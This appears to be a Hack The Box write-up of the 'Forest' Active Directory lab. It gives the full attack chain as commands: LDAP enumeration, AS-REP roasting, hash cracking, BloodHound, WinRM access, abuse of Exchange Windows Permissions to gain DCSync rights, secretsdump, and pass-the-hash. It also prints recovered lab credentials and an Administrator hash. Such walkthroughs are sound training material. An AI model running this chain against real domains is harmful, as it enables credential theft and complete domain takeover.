# Forest - Hack The Box Writeup

## Summary

Forest is an Active Directory machine that demonstrates common AD attack paths including anonymous LDAP enumeration, AS-REP Roasting, BloodHound-based privilege escalation analysis, abuse of Exchange Windows Permissions, DCSync, and Pass-the-Hash.

---

## 1. Initial Enumeration

Performed an Nmap scan against the target.

```bash
nmap -sC -sV -Pn 10.129.20.105
```

### Open Ports

```text
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0
```

The exposed LDAP, Kerberos, SMB, and WinRM services indicated that the target was an Active Directory Domain Controller.

---

## 2. Anonymous LDAP Enumeration

Verified that LDAP allowed anonymous queries.

```bash
ldapsearch -x -H ldap://10.129.20.105 -s base
```

This confirmed the presence of an Active Directory environment and allowed further enumeration.

---

## 3. User Enumeration

Enumerated domain users using LDAP.

```bash
nxc ldap 10.129.20.105 -u '' -p '' --users
```

Alternative method:

```bash
ldapsearch -x -H ldap://10.129.20.105 \
-b "DC=htb,DC=local" \
"(objectClass=user)"
```

A list of valid domain usernames was obtained and saved for further attacks.

---

## 4. AS-REP Roasting

Tested the discovered users for Kerberos pre-authentication weaknesses.

```bash
impacket-GetNPUsers htb.local/ \
-usersfile users.txt \
-format hashcat \
-outputfile hashes.txt \
-dc-ip 10.129.20.105
```

A vulnerable account was identified:

```text
svc-alfresco
```

The AS-REP hash was written to `hashes.txt`.

---

## 5. Password Recovery

Cracked the AS-REP hash using Hashcat.

```bash
hashcat -m 18200 hashes.txt \
/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
svc-alfresco : s3rvice
```

---

## 6. Kerberos Authentication

Requested a Kerberos TGT for the compromised account.

```bash
getTGT.py \
htb.local/svc-alfresco:'s3rvice' \
-dc-ip 10.129.20.105
```

Configured the Kerberos ticket cache.

```bash
export KRB5CCNAME=svc-alfresco.ccache
```

---

## 7. BloodHound Enumeration

Collected Active Directory information.

```bash
bloodhound-python \
-u svc-alfresco \
-p 's3rvice' \
-d htb.local \
-ns 10.129.20.105 \
-c All
```

Started BloodHound and imported the generated JSON files.

```bash
sudo neo4j start
bloodhound-start
```

Analysis of the graph revealed a path leading to control over the domain through Exchange-related permissions.

---

## 8. Initial Access

Identified WinRM on port 5985 and authenticated using the recovered credentials.

```bash
evil-winrm \
-i 10.129.20.105 \
-u svc-alfresco \
-p 's3rvice'
```

Obtained an interactive PowerShell session.

---

## 9. Create a Controlled Domain User

Created a new domain user.

```cmd
net user hackAgain Password123! /add /domain
```

Added the user to the Exchange Windows Permissions group.

```cmd
net group "Exchange Windows Permissions" hackAgain /add /domain
```

Verified membership.

```cmd
net group "Exchange Windows Permissions" /domain
```

---

## 10. Abuse Exchange Windows Permissions

The Exchange Windows Permissions group possesses the ability to modify ACLs on Active Directory objects.

Granted DCSync rights to the newly created user.

```bash
impacket-dacledit \
-action write \
-rights DCSync \
-principal hackAgain \
-target-dn "DC=htb,DC=local" \
htb.local/hackAgain:'Password123!' \
-dc-ip 10.129.20.105
```

The DACL of the domain object was successfully modified.

---

## 11. DCSync Attack

Performed a DCSync attack to retrieve password hashes from Active Directory.

```bash
impacket-secretsdump \
htb.local/hackAgain:'Password123!'@10.129.20.105
```

Retrieved the NTLM hash of the Administrator account.

---

## 12. Privilege Escalation

Authenticated as Administrator using Pass-the-Hash.

```bash
evil-winrm \
-i 10.129.20.105 \
-u Administrator \
-H 32693b11e6aa90eb43d32c72a07ceea6
```

Obtained full administrative access to the Domain Controller.

---

## Attack Path

```text
Anonymous LDAP Access
        ↓
User Enumeration
        ↓
AS-REP Roasting
        ↓
svc-alfresco Credentials
        ↓
BloodHound Analysis
        ↓
WinRM Access
        ↓
Create Controlled User
        ↓
Exchange Windows Permissions
        ↓
Grant DCSync Rights
        ↓
DCSync
        ↓
Administrator Hash
        ↓
Pass-the-Hash
        ↓
Domain Administrator
```
